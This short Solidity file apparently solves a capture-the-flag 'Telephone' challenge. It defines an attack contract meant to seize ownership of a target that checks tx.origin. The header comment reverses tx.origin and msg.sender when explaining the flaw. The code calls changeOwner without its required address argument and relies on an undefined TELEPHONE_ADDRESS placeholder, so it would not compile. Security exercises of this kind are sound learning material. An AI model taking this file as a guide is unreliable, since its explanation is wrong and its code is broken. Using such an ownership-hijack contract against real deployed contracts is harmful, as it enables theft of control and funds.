// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
	`tx.origin` can be used to create phishing attacks to contracts using them as checks.
	Prevent using `tx.origin` to check for msg.sender as in this case, we can use a contract
	to call Telephone's `changeOwner` function and `tx.origin` would be contract's address
	while `msg.sender` will be attacker's address.
 */

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
	Telephone t = Telephone(TELEPHONE_ADDRESS);

	function telephoneOrigin() public {
		t.changeOwner();
	}
}
